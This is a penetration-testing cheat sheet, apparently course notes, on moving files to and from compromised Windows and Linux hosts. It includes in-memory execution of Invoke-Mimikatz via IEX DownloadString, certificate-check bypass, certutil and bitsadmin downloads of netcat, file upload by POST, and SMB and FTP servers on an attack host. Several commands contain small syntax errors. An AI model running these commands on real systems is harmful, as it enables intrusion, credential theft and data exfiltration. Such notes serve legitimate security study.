## Windows
### PowerShell Base64 Encode & Decode
##### While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

#### Bash terminal:
1. md5sum id_rsa -> 4e301756a07ded0a2dd6953abf015278
2. cat id_rsa | base64 -w 0;echo -> we are getting somevalue
   
#### Windows PowerShell terminal:
3. PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("somevalue"))
4. Get-FileHash C:\Users\Public\id_rsa -Algorithm md5


### PowerShell Web Downloads
[System.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)
1.  C:\User>(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
1.  C:\User> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
1.  C:\User> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

### PowerShell DownloadString - Fileless Method
##### As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
| `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`                                  | additional command to bypass if we are facing with error related to SSL/TLS channel if the certificate is not trusted   |
|  `Invoke-WebRequest https://<something>/PowerView.ps1 -OutFile PowerView.ps1`                                      | Download a file with PowerShell.  PS onwards 3.0             |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX')`                                            | -UseBasicParsing helps with bypass errors in IE  |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |

[harmj0y PS extensive list](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### SMB Downloads
#### We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.

1. Create the SMB Server - sudo impacket-smbserver share -smb2support /tmp/smbshare
2. Copy a File from the SMB Server - C:\User> copy \\192.168.220.133\share\nc.exe = New versions of Windows block unauthenticated guest access, as we can see in the following command (set a username and password):
3. sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
4. Mount the SMB Server with Username and Password - C:\User> net use n: \\192.168.220.133\share /user:test test

### FTP Downloads
#### We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:

1. Installing the FTP Server Python3 Module - pyftpdlib = sudo pip3 install pyftpdlib
2. Setting up a Python3 FTP Server = sudo python3 -m pyftpdlib --port 21
3. Transfering Files from an FTP Server Using PowerShell = PS C:\User> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
4. When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
5. `C:\User> echo open 192.168.49.128 > ftpcommand.txt
C:\User> echo USER anonymous >> ftpcommand.txt
C:\User> echo binary >> ftpcommand.txt
C:\User> echo GET file.txt >> ftpcommand.txt
C:\User> echo bye >> ftpcommand.txt
C:\User> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\User>more file.txt
This is a test file`



---

### Linux
| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
